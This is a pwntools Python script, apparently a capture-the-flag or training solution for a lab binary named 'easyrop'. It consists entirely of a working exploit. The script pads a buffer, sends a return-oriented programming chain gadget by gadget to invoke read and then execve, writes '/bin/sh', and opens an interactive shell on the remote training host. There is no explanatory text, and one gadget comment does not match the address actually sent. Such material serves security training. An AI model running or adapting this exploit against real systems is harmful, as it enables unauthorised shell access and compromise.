import time
from pwn import *

if "REMOTE" not in args:
	s = ssh(host='localhost',user='acidburn',port=2222)
	r= s.process('/home/acidburn/Desktop/rop/2/easyrop')
else:
	r = remote("bin.training.jinblack.it", 2015)


ptr_write = 0x0804830c
next_fun = 0x0804841d
got = 0x08049614

for x in range(28):
	r.send(b'\x90\x90\x90\x90')
	time.sleep(0.1)


#0x7fff ffffea09
#0x7fff ffffee5a
#0x00000000004001c2: pop rdi; pop rsi; pop rdx; pop rax; ret; 
r.send(b'\xc2\x01\x40\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)

r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)

r.send(b'\x01\x00\x00\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)

r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)

#0x600378
r.send(b'\x78\x03\x60\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)

r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)

r.send(b'\x10\x00\x00\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)

r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)

r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)


r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)

#0x0000000000400168: syscall;
r.send(b'\xb3\x01\x40\x00')
time.sleep(0.1)

r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)


r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)


r.send(b'\x01\x00\x00\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)

r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)

#0x00000000004001c2: pop rdi; pop rsi; pop rdx; pop rax; ret; 
r.send(b'\xc2\x01\x40\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)

r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)

#0x600378
r.send(b'\x78\x03\x60\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)


r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)


r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)



r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)


r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)



r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)



r.send(b'\x3b\x00\x00\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)


r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)
r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)


#0x0000000000400168: syscall;
r.send(b'\xb3\x01\x40\x00')
time.sleep(0.1)

r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)

r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)

r.send(b'\x00\x00\x00\x00')
time.sleep(0.1)

r.send(b'\x08')
time.sleep(0.1)

r.send(b'\x01')
time.sleep(0.1)

input("wait")
r.send(b"/bin/sh")
time.sleep(0.1)
r.interactive()



